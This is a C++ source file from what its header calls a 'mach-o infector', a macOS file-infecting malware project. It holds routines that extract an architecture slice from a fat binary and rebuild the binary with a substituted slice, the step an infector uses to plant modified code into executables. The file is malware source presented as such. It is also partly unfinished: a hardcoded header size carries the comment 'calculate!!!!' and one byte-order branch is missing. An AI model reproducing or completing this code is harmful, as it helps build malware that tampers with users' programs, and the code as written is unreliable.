//
//  fat.cpp
//  mach-o infector
//
//  Created by Pest on 27.11.14.
//  Copyright (c) 2014 coru.ws. All rights reserved.
//

#include "fat.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <mach-o/fat.h>
#include <mach-o/loader.h>


static uint64_t align(uint64_t x,uint64_t y){
    return (x+(y-1))&(~(y-1));
}


static uint32 swap32(uint32 a){
    return ((a>>24)&0xFF)|((a<<24)&0xFF000000)|((a>>8)&0xFF00)|((a<<8)&0xFF0000);
}


bool get_arch_from_fat(uint8 *buf,uint32 size,uint32 cputype,uint8 *&out,uint32 &lout){
    uint8 *pen=buf+size;
    uint8 *p=buf;
    fat_header *h=(fat_header*)p;
    p+=sizeof(fat_header);
    if (p>pen)
        return false;
    
    if (h->magic==swap32(FAT_MAGIC)){
        fat_arch *arh=(fat_arch*)p;
        int n=swap32(h->nfat_arch);
        for (int i=0;i<n;i++){
            p+=sizeof(fat_arch);
            if (p>pen)
                return false;
            if (arh[i].cputype==swap32(cputype)){
                out=buf+swap32(arh[i].offset);
                lout=swap32(arh[i].size);
                return true;
            }
        }
    }
    
    if (h->magic==FAT_MAGIC){
        fat_arch *arh=(fat_arch*)p;
        int n=h->nfat_arch;
        for (int i=0;i<n;i++){
            p+=sizeof(fat_arch);
            if (p>pen)
                return false;
            if (arh[i].cputype==cputype){
                out=buf+arh[i].offset;
                lout=arh[i].size;
                return true;
            }
        }
    }
    
    return false;
}



bool update_arch_fat(uint8 *&buf,uint32 &size,uint32 cputype,uint8 *in,uint32 lin){
    uint8 *pen=buf+size;
    uint8 *p=buf;
    fat_header *h=(fat_header*)p;
    p+=sizeof(fat_header);
    if (p>pen)
        return false;
    uint32 l=0;
    uint32 max;
    
    if (h->magic==swap32(FAT_MAGIC)){
        fat_arch *arh=(fat_arch*)p;
        int n=swap32(h->nfat_arch);
        int lh=0x1000;//calculate!!!!
        max=lh;
        for (int i=0;i<n;i++){
            p+=sizeof(fat_arch);
            if (p>pen)
                return false;
            if (arh[i].cputype==swap32(cputype)){
                l=align(lin,1<<swap32(arh[i].align));
                max+=l;
            }else{
                max+=swap32(arh[i].size);
            }
        }
        
        if (!l)
            return false;
        
        uint8 *bin=(uint8*)malloc(max);
        if (!bin)
            return false;
        
        fat_arch *arch_bin=(fat_arch*)(bin+sizeof(fat_header));
        memset(bin,0,max);
        memcpy(bin,buf,lh);
        uint32 j1=lh,j2=lh;
        for (int i=0;i<n;i++){
            uint32 len=swap32(arh[i].size);
            uint32 alen=align(len,1<<swap32(arh[i].align));
            
            if (arh[i].cputype==swap32(cputype)){
                len=l;
                memcpy(&bin[j1],in,lin);
                arch_bin[i].offset=swap32(j1);
                arch_bin[i].size=swap32(len);
                arch_bin[i].align=arh[i].align;
                j2+=alen;
                j1+=l;
            }else{
                memcpy(&bin[j1],&buf[j2],len);
                arch_bin[i].offset=swap32(j1);
                arch_bin[i].size=swap32(len);
                j1+=alen;
                j2+=alen;
            }
        }
        free(buf);
        buf=bin;
        size=max;
        return true;
        
    }
    
    return false;
}




